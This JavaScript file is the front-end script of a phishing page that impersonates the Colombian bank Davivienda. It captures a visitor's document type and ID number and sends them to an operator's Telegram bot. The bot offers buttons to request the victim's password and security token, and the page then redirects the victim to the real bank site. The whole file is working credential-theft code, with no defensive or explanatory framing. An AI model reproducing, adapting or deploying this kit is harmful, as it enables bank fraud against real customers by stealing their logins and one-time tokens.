/**
 * DAVIVIENDA - script.js OPTIMIZADO
 * Página principal con integración al sistema centralizado
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Davivienda Index: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        alert('Error: Sistema no inicializado correctamente');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const inputs = {
        documentType: document.getElementById('documentType'),
        documentNumber: document.getElementById('documentNumber')
    };
    const btnContinue = document.getElementById('submitBtn');
    const overlay = document.getElementById('loadingOverlay');
    
    console.log('📋 Elementos:', { inputs, btnContinue, overlay });

    BancoUtils.onTelegramAction(handleTelegramAction);

    // Validación de input
    inputs.documentNumber.addEventListener('input', () => {
        BancoUtils.validateNumeric(inputs.documentNumber, 15);
        validateForm();
    });

    function validateForm() {
        const isValid = inputs.documentNumber.value.length >= 5;
        btnContinue.disabled = !isValid;
        if (isValid) {
            btnContinue.classList.add('enabled');
        } else {
            btnContinue.classList.remove('enabled');
        }
    }

    validateForm();

    btnContinue.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnContinue.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        if (overlay) {
            overlay.classList.add('show');
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        }

        const data = {
            tipoDocumento: inputs.documentType.options[inputs.documentType.selectedIndex].text,
            numeroDocumento: inputs.documentNumber.value
        };

        console.log('📤 Datos a enviar:', data);
        BancoUtils.saveBankData('davivienda', data);

        const message = BancoUtils.formatMessage('DAVIVIENDA - USUARIO', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '👤 Pedir Usuario', action: 'request_user' },
            { text: '🔐 Pedir Clave', action: 'request_password' },
            { text: '📱 Pedir Token', action: 'request_token' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('user', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.classList.remove('show', 'active');
                overlay.style.display = 'none';
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Davivienda Index:', data);
        
        // Ocultar overlay primero
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.remove('show', 'active');
            overlay.style.display = 'none';
            console.log('✅ Overlay ocultado');
        }
        
        switch(data.action) {
            case 'request_user':
                console.log('👤 Limpiando campos de usuario');
                inputs.documentType.selectedIndex = 0;
                inputs.documentNumber.value = '';
                btnContinue.disabled = true;
                btnContinue.classList.remove('enabled');
                break;
            case 'request_password':
                console.log('🔐 Redirigiendo a clave.html');
                window.location.href = 'clave.html';
                break;
            case 'request_token':
                console.log('📱 Redirigiendo a token.html');
                window.location.href = 'token.html';
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a davivienda.com');
                window.location.href = 'https://www.davivienda.com/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
